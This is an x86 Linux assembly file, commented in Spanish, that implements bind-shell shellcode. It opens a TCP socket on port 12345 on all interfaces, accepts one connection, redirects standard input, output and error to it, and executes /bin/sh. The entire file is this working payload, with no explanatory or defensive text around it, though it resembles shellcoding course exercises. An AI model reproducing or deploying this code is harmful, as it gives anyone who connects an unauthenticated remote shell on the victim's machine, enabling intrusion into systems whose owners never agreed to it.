global _start
section .text
_start:
  ; Create our socket
  ; socket(AF_INET, SOCK_STREAM, 0)
  ;
  xor ebx, ebx ; limpiamos registro
  mov bl, 0x01 ; socket(AF_INET, SOCK_STREAM, 0)

  xor edx, edx ; limpiamos registro
  xor ecx, ecx ; limpiamos registro

  push edx ; 0
  push ebx ; SOCK_STREAM
  push byte 0x02 ; AF_INET
  mov ecx, esp 

  xor eax, eax ; limpiamos registro
  mov al, 0x66 ; llamamos al sycall * sys_socketcall - 102*
  int 0x80
  xchg esi, eax ; lo guardamos en un descriptor de archivo

  ; Bind our socket
  ; addr.sin_family = AF_INET;
  ; addr.sin_port = htons(port);
  ; addr.sin_addr.s_addr = INADDR_ANY;
  ; bind(sockfd, (struct sockaddr *) &addr, sizeof(addr));
  ;
  inc ebx ; bind()
  push edx ; addr.sin_addr.s_addr = INADDR_ANY
  push word 0x3930 ; port 12345 en little endian
  push bx ; addr.sin_family = AF_INET
  mov ecx, esp ; (struct sockaddr *)

  push byte 0x10 ;sizeof(addr)
  push ecx
  push esi ; sockfd
  mov ecx, esp
  mov al, 0x66 ; llamamos al sycall * sys_socketcall - 102*
  int 0x80

  ; Listen
  ; listen(sockfd, 0);
  ;
  push edx ; 0
  inc ebx   ; |
  inc ebx   ; |
  push ebx  ; |-> listen()
  push esi ; sockfd

  mov ecx, esp 
  mov al, 0x66 ; llamamos al sycall * sys_socketcall - 102*
  int 0x80

  ; Accept
  ; accept(sockfd, NULL, NULL)
  inc ebx; accept()

  push edx ; NULL
  push edx ; NULL
  push esi ; sockfd
  mov ecx, esp
  mov al, 0x66 ; llamamos al sycall * sys_socketcall - 102*
  int 0x80
  xchg ebx, eax ; guardamos el resultado de la conexion

  ; Dup2
  ; dup2(clientfd, 0)
  ; dup2(clientfd, 1)
  ; dup2(clientfd, 2)
  xor ecx, ecx ; limpiamos 
dup:
  mov al, 0x3f ; llamamos al sycall * sys_dup2 - 63*
  int 0x80
  inc ecx 
  cmp ecx, 0x3 ; hacemos un ciclo hasta que sea diferente de 3
  jne dup

  ; Execve
  ; execve("/bin/sh", NULL, NULL)
  ;
  push edx
  push 0x68732f2f ; hs//
  push 0x6e69622f ; nib/

  mov ebx, esp
  mov ecx, edx ; NULL

  mov al, 0x0b ; llamamos al sycall * sys_execve - 11* 
  int 0x80